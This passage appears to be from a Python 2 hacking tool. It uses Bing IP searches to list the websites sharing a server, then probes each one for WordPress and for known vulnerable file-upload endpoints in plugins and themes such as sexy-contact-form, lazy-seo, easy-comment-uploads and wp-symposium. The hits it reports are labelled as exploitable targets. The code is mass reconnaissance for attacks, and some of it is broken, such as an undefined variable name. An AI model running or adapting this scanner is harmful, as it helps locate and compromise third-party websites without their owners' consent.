    except : 
         pass 
def checksqli(sqli):
                            responsetwo = urllib2.urlopen(sqli).read()
                            find = re.findall('type="file"',responsetwo)
                            if find:
                                            print(" Dapat ==> " + sqli)
def sqlscan():                                           
    ip = raw_input('Enter IP : ')
    grabsqli(ip)
# Dapat this code on stackoverflow.com/questions/19278877
def unique(seq):
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]
def bing_all_grabber(s):
    lista = []
    page = 1
    while page <= 101:
        try:
            bing = "http://www.bing.com/search?q=ip%3A" + s + "+&count=50&first=" + str(page)
            openbing = urllib2.urlopen(bing)
            readbing = openbing.read()
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            for i in range(len(findwebs)):
                allnoclean = findwebs[i]
                findall1 = re.findall('http://(.*?)/', allnoclean)
                for idx, item in enumerate(findall1):
                    if 'www' not in item:
                        findall1[idx] = 'http://www.' + item + '/'
                    else:
                        findall1[idx] = 'http://' + item + '/'
                lista.extend(findall1)

            page += 50
        except urllib2.URLError:
            pass

    final = unique(lista)
    return final
def check_wordpress(sites) :
    wp = []
    for site in sites :
        try :
            if urllib2.urlopen(site+'wp-login.php').getcode() == 200 :
                wp.append(site)
        except :
            pass

    return wp
def check_wpstorethemeremotefileupload(sites) :
    wpstorethemeremotefileupload = []
    for site in sites :
        try :
            if urllib2.urlopen(site+'wp-content/themes/WPStore/upload/index.php').getcode() == 200 :
                wpstorethemeremotefileupload.append(site)
        except :
            pass

    return wpstorethemeremotefileupload
def check_wpcontactcreativeform(sites) :
    wpcontactcreativeform = []
    for site in sites :
        try :
            if urllib2.urlopen(site+'wp-content/plugins/sexy-contact-form/includes/fileupload/index.php').getcode() == 200 :
                wpcontactcreativeform.append(site)
        except :
            pass

    return wpcontactcreativeform
def check_wplazyseoplugin(sites) :
    wplazyseoplugin = []
    for site in sites :
        try :
            if urllib2.urlopen(site+'wp-content/plugins/lazy-seo/lazyseo.php').getcode() == 200 :
                wplazyseoplugin.append(site)
        except :
            pass

    return wplazyseoplugin
def check_wpeasyupload(sites) :
    wpeasyupload = []
    for site in sites :
        try :
            if urllib2.urlopen(site+'wp-content/plugins/easy-comment-uploads/upload-form.php').getcode() == 200 :
                wpeasyupload.append(site)
        except :
            pass

    return wpeasyupload
def check_wpsymposium(sites) :
    wpsymposium = []
    for site in sites :
        try :
            if urllib2.urlopen(site+'wp-symposium/server/file_upload_form.php').getcode() == 200 :
                wpsycmium.append(site)
        except :
            pass

    return wpsymposium
def wpminiscanner():
    ip = raw_input('Enter IP : ')
    sites = bing_all_grabber(str(ip))
    wordpress = check_wordpress(sites)
    wpstorethemeremotefileupload = check_wpstorethemeremotefileupload(sites)
    wpcontactcreativeform = check_wpcontactcreativeform(sites)
    wplazyseoplugin = check_wplazyseoplugin(sites)
    wpeasyupload = check_wpeasyupload(sites)
    wpsymposium = check_wpsymposium(sites)
    for ss in wordpress :
        print ss
    print '[*] Dapat, ', len(wordpress), ' wordpress sites.'
    print '-'*30+'\n'
    for ss in wpstorethemeremotefileupload  :
        print ss
    print '[*] Dapat, ', len(wpstorethemeremotefileupload), ' wp_storethemeremotefileupload exploit.'
    print '-'*30+'\n'
    for ss in wpcontactcreativeform  :
        print ss
    print '[*] Dapat, ', len(wpcontactcreativeform), ' wp_contactcreativeform exploit.'
    print '-'*30+'\n'
    for ss in wplazyseoplugin  :
        print ss
    print '[*] Dapat, ', len(wplazyseoplugin), ' wp_lazyseoplugin exploit.'
    print '-'*30+'\n'
    for ss in wpeasyupload  :
        print ss
    print '[*] Dapat, ', len(wpeasyupload), ' wp_easyupload exploit.'
    print '-'*30+'\n'
    for ss in wpsymposium :
        print ss


    print '[*] Dapat, ', len(wpsymposium), ' wp_sympsiup exploit.'

    print '\n'
############################
#begin :D 
if __name__ == "__main__":
  menu()

    
    
    
  
